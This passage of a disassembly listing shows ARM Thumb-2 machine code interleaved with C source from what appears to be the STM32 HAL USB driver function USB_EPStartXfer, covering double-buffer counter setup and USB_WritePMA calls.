 8006fa8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fb0:	681b      	ldr	r3, [r3, #0]
 8006fb2:	6a1b      	ldr	r3, [r3, #32]
 8006fb4:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006fb8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fbc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fc0:	681b      	ldr	r3, [r3, #0]
 8006fc2:	2200      	movs	r2, #0
 8006fc4:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006fc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fce:	681b      	ldr	r3, [r3, #0]
 8006fd0:	785b      	ldrb	r3, [r3, #1]
 8006fd2:	2b00      	cmp	r3, #0
 8006fd4:	d177      	bne.n	80070c6 <USB_EPStartXfer+0x4c4>
 8006fd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fda:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fde:	681b      	ldr	r3, [r3, #0]
 8006fe0:	61bb      	str	r3, [r7, #24]
 8006fe2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fe6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fea:	681b      	ldr	r3, [r3, #0]
 8006fec:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006ff0:	b29b      	uxth	r3, r3
 8006ff2:	461a      	mov	r2, r3
 8006ff4:	69bb      	ldr	r3, [r7, #24]
 8006ff6:	4413      	add	r3, r2
 8006ff8:	61bb      	str	r3, [r7, #24]
 8006ffa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ffe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007002:	681b      	ldr	r3, [r3, #0]
 8007004:	781b      	ldrb	r3, [r3, #0]
 8007006:	00da      	lsls	r2, r3, #3
 8007008:	69bb      	ldr	r3, [r7, #24]
 800700a:	4413      	add	r3, r2
 800700c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007010:	617b      	str	r3, [r7, #20]
 8007012:	697b      	ldr	r3, [r7, #20]
 8007014:	881b      	ldrh	r3, [r3, #0]
 8007016:	b29b      	uxth	r3, r3
 8007018:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800701c:	b29a      	uxth	r2, r3
 800701e:	697b      	ldr	r3, [r7, #20]
 8007020:	801a      	strh	r2, [r3, #0]
 8007022:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007026:	2b3e      	cmp	r3, #62	; 0x3e
 8007028:	d921      	bls.n	800706e <USB_EPStartXfer+0x46c>
 800702a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800702e:	095b      	lsrs	r3, r3, #5
 8007030:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007034:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007038:	f003 031f 	and.w	r3, r3, #31
 800703c:	2b00      	cmp	r3, #0
 800703e:	d104      	bne.n	800704a <USB_EPStartXfer+0x448>
 8007040:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007044:	3b01      	subs	r3, #1
 8007046:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 800704a:	697b      	ldr	r3, [r7, #20]
 800704c:	881b      	ldrh	r3, [r3, #0]
 800704e:	b29a      	uxth	r2, r3
 8007050:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8007054:	b29b      	uxth	r3, r3
 8007056:	029b      	lsls	r3, r3, #10
 8007058:	b29b      	uxth	r3, r3
 800705a:	4313      	orrs	r3, r2
 800705c:	b29b      	uxth	r3, r3
 800705e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007062:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007066:	b29a      	uxth	r2, r3
 8007068:	697b      	ldr	r3, [r7, #20]
 800706a:	801a      	strh	r2, [r3, #0]
 800706c:	e056      	b.n	800711c <USB_EPStartXfer+0x51a>
 800706e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007072:	2b00      	cmp	r3, #0
 8007074:	d10a      	bne.n	800708c <USB_EPStartXfer+0x48a>
 8007076:	697b      	ldr	r3, [r7, #20]
 8007078:	881b      	ldrh	r3, [r3, #0]
 800707a:	b29b      	uxth	r3, r3
 800707c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007080:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007084:	b29a      	uxth	r2, r3
 8007086:	697b      	ldr	r3, [r7, #20]
 8007088:	801a      	strh	r2, [r3, #0]
 800708a:	e047      	b.n	800711c <USB_EPStartXfer+0x51a>
 800708c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007090:	085b      	lsrs	r3, r3, #1
 8007092:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8007096:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800709a:	f003 0301 	and.w	r3, r3, #1
 800709e:	2b00      	cmp	r3, #0
 80070a0:	d004      	beq.n	80070ac <USB_EPStartXfer+0x4aa>
 80070a2:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070a6:	3301      	adds	r3, #1
 80070a8:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 80070ac:	697b      	ldr	r3, [r7, #20]
 80070ae:	881b      	ldrh	r3, [r3, #0]
 80070b0:	b29a      	uxth	r2, r3
 80070b2:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 80070b6:	b29b      	uxth	r3, r3
 80070b8:	029b      	lsls	r3, r3, #10
 80070ba:	b29b      	uxth	r3, r3
 80070bc:	4313      	orrs	r3, r2
 80070be:	b29a      	uxth	r2, r3
 80070c0:	697b      	ldr	r3, [r7, #20]
 80070c2:	801a      	strh	r2, [r3, #0]
 80070c4:	e02a      	b.n	800711c <USB_EPStartXfer+0x51a>
 80070c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ce:	681b      	ldr	r3, [r3, #0]
 80070d0:	785b      	ldrb	r3, [r3, #1]
 80070d2:	2b01      	cmp	r3, #1
 80070d4:	d122      	bne.n	800711c <USB_EPStartXfer+0x51a>
 80070d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070da:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070de:	681b      	ldr	r3, [r3, #0]
 80070e0:	623b      	str	r3, [r7, #32]
 80070e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070e6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070ea:	681b      	ldr	r3, [r3, #0]
 80070ec:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80070f0:	b29b      	uxth	r3, r3
 80070f2:	461a      	mov	r2, r3
 80070f4:	6a3b      	ldr	r3, [r7, #32]
 80070f6:	4413      	add	r3, r2
 80070f8:	623b      	str	r3, [r7, #32]
 80070fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007102:	681b      	ldr	r3, [r3, #0]
 8007104:	781b      	ldrb	r3, [r3, #0]
 8007106:	00da      	lsls	r2, r3, #3
 8007108:	6a3b      	ldr	r3, [r7, #32]
 800710a:	4413      	add	r3, r2
 800710c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007110:	61fb      	str	r3, [r7, #28]
 8007112:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007116:	b29a      	uxth	r2, r3
 8007118:	69fb      	ldr	r3, [r7, #28]
 800711a:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 800711c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007120:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007124:	681b      	ldr	r3, [r3, #0]
 8007126:	891b      	ldrh	r3, [r3, #8]
 8007128:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800712c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007130:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007134:	681b      	ldr	r3, [r3, #0]
 8007136:	6959      	ldr	r1, [r3, #20]
 8007138:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800713c:	b29b      	uxth	r3, r3
 800713e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007142:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007146:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800714a:	6800      	ldr	r0, [r0, #0]
 800714c:	f001 fa65 	bl	800861a <USB_WritePMA>
 8007150:	e3ee      	b.n	8007930 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007152:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007156:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800715a:	681b      	ldr	r3, [r3, #0]
 800715c:	785b      	ldrb	r3, [r3, #1]
 800715e:	2b00      	cmp	r3, #0
 8007160:	d177      	bne.n	8007252 <USB_EPStartXfer+0x650>
 8007162:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007166:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800716a:	681b      	ldr	r3, [r3, #0]
 800716c:	64bb      	str	r3, [r7, #72]	; 0x48
 800716e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007172:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007176:	681b      	ldr	r3, [r3, #0]
 8007178:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800717c:	b29b      	uxth	r3, r3
 800717e:	461a      	mov	r2, r3
 8007180:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8007182:	4413      	add	r3, r2
 8007184:	64bb      	str	r3, [r7, #72]	; 0x48
 8007186:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800718a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800718e:	681b      	ldr	r3, [r3, #0]
 8007190:	781b      	ldrb	r3, [r3, #0]
 8007192:	00da      	lsls	r2, r3, #3
 8007194:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8007196:	4413      	add	r3, r2
 8007198:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800719c:	647b      	str	r3, [r7, #68]	; 0x44
 800719e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071a0:	881b      	ldrh	r3, [r3, #0]
 80071a2:	b29b      	uxth	r3, r3
 80071a4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80071a8:	b29a      	uxth	r2, r3
 80071aa:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071ac:	801a      	strh	r2, [r3, #0]
 80071ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071b2:	2b3e      	cmp	r3, #62	; 0x3e
 80071b4:	d921      	bls.n	80071fa <USB_EPStartXfer+0x5f8>
 80071b6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ba:	095b      	lsrs	r3, r3, #5
 80071bc:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80071c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071c4:	f003 031f 	and.w	r3, r3, #31
 80071c8:	2b00      	cmp	r3, #0
 80071ca:	d104      	bne.n	80071d6 <USB_EPStartXfer+0x5d4>
 80071cc:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80071d0:	3b01      	subs	r3, #1
 80071d2:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80071d6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071d8:	881b      	ldrh	r3, [r3, #0]
 80071da:	b29a      	uxth	r2, r3
 80071dc:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80071e0:	b29b      	uxth	r3, r3
 80071e2:	029b      	lsls	r3, r3, #10
 80071e4:	b29b      	uxth	r3, r3
 80071e6:	4313      	orrs	r3, r2
 80071e8:	b29b      	uxth	r3, r3
 80071ea:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80071ee:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80071f2:	b29a      	uxth	r2, r3
 80071f4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80071f6:	801a      	strh	r2, [r3, #0]
 80071f8:	e056      	b.n	80072a8 <USB_EPStartXfer+0x6a6>
 80071fa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071fe:	2b00      	cmp	r3, #0
 8007200:	d10a      	bne.n	8007218 <USB_EPStartXfer+0x616>
 8007202:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007204:	881b      	ldrh	r3, [r3, #0]
 8007206:	b29b      	uxth	r3, r3
 8007208:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800720c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007210:	b29a      	uxth	r2, r3
 8007212:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007214:	801a      	strh	r2, [r3, #0]
 8007216:	e047      	b.n	80072a8 <USB_EPStartXfer+0x6a6>
 8007218:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800721c:	085b      	lsrs	r3, r3, #1
 800721e:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007222:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007226:	f003 0301 	and.w	r3, r3, #1
 800722a:	2b00      	cmp	r3, #0
 800722c:	d004      	beq.n	8007238 <USB_EPStartXfer+0x636>
 800722e:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007232:	3301      	adds	r3, #1
 8007234:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007238:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800723a:	881b      	ldrh	r3, [r3, #0]
 800723c:	b29a      	uxth	r2, r3
 800723e:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007242:	b29b      	uxth	r3, r3
 8007244:	029b      	lsls	r3, r3, #10
 8007246:	b29b      	uxth	r3, r3
 8007248:	4313      	orrs	r3, r2
 800724a:	b29a      	uxth	r2, r3
 800724c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800724e:	801a      	strh	r2, [r3, #0]
 8007250:	e02a      	b.n	80072a8 <USB_EPStartXfer+0x6a6>
 8007252:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007256:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800725a:	681b      	ldr	r3, [r3, #0]
 800725c:	785b      	ldrb	r3, [r3, #1]
 800725e:	2b01      	cmp	r3, #1
 8007260:	d122      	bne.n	80072a8 <USB_EPStartXfer+0x6a6>
 8007262:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007266:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800726a:	681b      	ldr	r3, [r3, #0]
 800726c:	653b      	str	r3, [r7, #80]	; 0x50
 800726e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007272:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007276:	681b      	ldr	r3, [r3, #0]
 8007278:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800727c:	b29b      	uxth	r3, r3
 800727e:	461a      	mov	r2, r3
 8007280:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007282:	4413      	add	r3, r2
 8007284:	653b      	str	r3, [r7, #80]	; 0x50
 8007286:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800728a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800728e:	681b      	ldr	r3, [r3, #0]
 8007290:	781b      	ldrb	r3, [r3, #0]
 8007292:	00da      	lsls	r2, r3, #3
 8007294:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007296:	4413      	add	r3, r2
 8007298:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800729c:	64fb      	str	r3, [r7, #76]	; 0x4c
 800729e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072a2:	b29a      	uxth	r2, r3
 80072a4:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80072a6:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80072a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072b0:	681b      	ldr	r3, [r3, #0]
 80072b2:	891b      	ldrh	r3, [r3, #8]
 80072b4:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072b8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072bc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072c0:	681b      	ldr	r3, [r3, #0]
 80072c2:	6959      	ldr	r1, [r3, #20]
 80072c4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072c8:	b29b      	uxth	r3, r3
 80072ca:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072ce:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072d2:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80072d6:	6800      	ldr	r0, [r0, #0]
 80072d8:	f001 f99f 	bl	800861a <USB_WritePMA>
            ep->xfer_buff += len;
 80072dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072e4:	681b      	ldr	r3, [r3, #0]
 80072e6:	695a      	ldr	r2, [r3, #20]
 80072e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072ec:	441a      	add	r2, r3
 80072ee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072f2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072f6:	681b      	ldr	r3, [r3, #0]
 80072f8:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 80072fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007302:	681b      	ldr	r3, [r3, #0]
 8007304:	6a1a      	ldr	r2, [r3, #32]
 8007306:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800730a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800730e:	681b      	ldr	r3, [r3, #0]
 8007310:	691b      	ldr	r3, [r3, #16]
 8007312:	429a      	cmp	r2, r3
 8007314:	d90f      	bls.n	8007336 <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 8007316:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800731e:	681b      	ldr	r3, [r3, #0]
 8007320:	6a1a      	ldr	r2, [r3, #32]
 8007322:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007326:	1ad2      	subs	r2, r2, r3
 8007328:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800732c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007330:	681b      	ldr	r3, [r3, #0]
 8007332:	621a      	str	r2, [r3, #32]
 8007334:	e00e      	b.n	8007354 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 8007336:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800733a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800733e:	681b      	ldr	r3, [r3, #0]
 8007340:	6a1b      	ldr	r3, [r3, #32]
 8007342:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8007346:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800734a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800734e:	681b      	ldr	r3, [r3, #0]
 8007350:	2200      	movs	r2, #0
 8007352:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007354:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007358:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800735c:	681b      	ldr	r3, [r3, #0]
 800735e:	643b      	str	r3, [r7, #64]	; 0x40
 8007360:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007364:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007368:	681b      	ldr	r3, [r3, #0]
 800736a:	785b      	ldrb	r3, [r3, #1]
 800736c:	2b00      	cmp	r3, #0
 800736e:	d177      	bne.n	8007460 <USB_EPStartXfer+0x85e>
 8007370:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007374:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007378:	681b      	ldr	r3, [r3, #0]
 800737a:	63bb      	str	r3, [r7, #56]	; 0x38
 800737c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007380:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007384:	681b      	ldr	r3, [r3, #0]
 8007386:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800738a:	b29b      	uxth	r3, r3
 800738c:	461a      	mov	r2, r3
 800738e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007390:	4413      	add	r3, r2
 8007392:	63bb      	str	r3, [r7, #56]	; 0x38
 8007394:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007398:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800739c:	681b      	ldr	r3, [r3, #0]
 800739e:	781b      	ldrb	r3, [r3, #0]
 80073a0:	00da      	lsls	r2, r3, #3
 80073a2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80073a4:	4413      	add	r3, r2
 80073a6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80073aa:	637b      	str	r3, [r7, #52]	; 0x34
 80073ac:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073ae:	881b      	ldrh	r3, [r3, #0]
 80073b0:	b29b      	uxth	r3, r3
 80073b2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80073b6:	b29a      	uxth	r2, r3
 80073b8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073ba:	801a      	strh	r2, [r3, #0]
 80073bc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073c0:	2b3e      	cmp	r3, #62	; 0x3e
 80073c2:	d921      	bls.n	8007408 <USB_EPStartXfer+0x806>
 80073c4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073c8:	095b      	lsrs	r3, r3, #5
 80073ca:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80073ce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073d2:	f003 031f 	and.w	r3, r3, #31
 80073d6:	2b00      	cmp	r3, #0
 80073d8:	d104      	bne.n	80073e4 <USB_EPStartXfer+0x7e2>
 80073da:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80073de:	3b01      	subs	r3, #1
 80073e0:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80073e4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80073e6:	881b      	ldrh	r3, [r3, #0]
 80073e8:	b29a      	uxth	r2, r3
 80073ea:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80073ee:	b29b      	uxth	r3, r3
 80073f0:	029b      	lsls	r3, r3, #10
 80073f2:	b29b      	uxth	r3, r3
 80073f4:	4313      	orrs	r3, r2
 80073f6:	b29b      	uxth	r3, r3
 80073f8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80073fc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007400:	b29a      	uxth	r2, r3
 8007402:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007404:	801a      	strh	r2, [r3, #0]
 8007406:	e050      	b.n	80074aa <USB_EPStartXfer+0x8a8>
 8007408:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800740c:	2b00      	cmp	r3, #0
 800740e:	d10a      	bne.n	8007426 <USB_EPStartXfer+0x824>
 8007410:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007412:	881b      	ldrh	r3, [r3, #0]
 8007414:	b29b      	uxth	r3, r3
 8007416:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800741a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800741e:	b29a      	uxth	r2, r3
 8007420:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007422:	801a      	strh	r2, [r3, #0]
 8007424:	e041      	b.n	80074aa <USB_EPStartXfer+0x8a8>
 8007426:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800742a:	085b      	lsrs	r3, r3, #1
 800742c:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007430:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007434:	f003 0301 	and.w	r3, r3, #1
 8007438:	2b00      	cmp	r3, #0
 800743a:	d004      	beq.n	8007446 <USB_EPStartXfer+0x844>
 800743c:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007440:	3301      	adds	r3, #1
 8007442:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007446:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007448:	881b      	ldrh	r3, [r3, #0]
 800744a:	b29a      	uxth	r2, r3
 800744c:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007450:	b29b      	uxth	r3, r3
 8007452:	029b      	lsls	r3, r3, #10
 8007454:	b29b      	uxth	r3, r3
 8007456:	4313      	orrs	r3, r2
 8007458:	b29a      	uxth	r2, r3
 800745a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800745c:	801a      	strh	r2, [r3, #0]
 800745e:	e024      	b.n	80074aa <USB_EPStartXfer+0x8a8>
 8007460:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007464:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007468:	681b      	ldr	r3, [r3, #0]
 800746a:	785b      	ldrb	r3, [r3, #1]
 800746c:	2b01      	cmp	r3, #1
 800746e:	d11c      	bne.n	80074aa <USB_EPStartXfer+0x8a8>
 8007470:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007474:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007478:	681b      	ldr	r3, [r3, #0]
 800747a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800747e:	b29b      	uxth	r3, r3
 8007480:	461a      	mov	r2, r3
 8007482:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007484:	4413      	add	r3, r2
 8007486:	643b      	str	r3, [r7, #64]	; 0x40
 8007488:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800748c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007490:	681b      	ldr	r3, [r3, #0]
 8007492:	781b      	ldrb	r3, [r3, #0]
 8007494:	00da      	lsls	r2, r3, #3
 8007496:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007498:	4413      	add	r3, r2
 800749a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800749e:	63fb      	str	r3, [r7, #60]	; 0x3c
 80074a0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074a4:	b29a      	uxth	r2, r3
 80074a6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80074a8:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 80074aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074b2:	681b      	ldr	r3, [r3, #0]
 80074b4:	895b      	ldrh	r3, [r3, #10]
 80074b6:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80074ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074c2:	681b      	ldr	r3, [r3, #0]
 80074c4:	6959      	ldr	r1, [r3, #20]
 80074c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ca:	b29b      	uxth	r3, r3
 80074cc:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80074d0:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80074d4:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80074d8:	6800      	ldr	r0, [r0, #0]
 80074da:	f001 f89e 	bl	800861a <USB_WritePMA>
 80074de:	e227      	b.n	8007930 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 80074e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
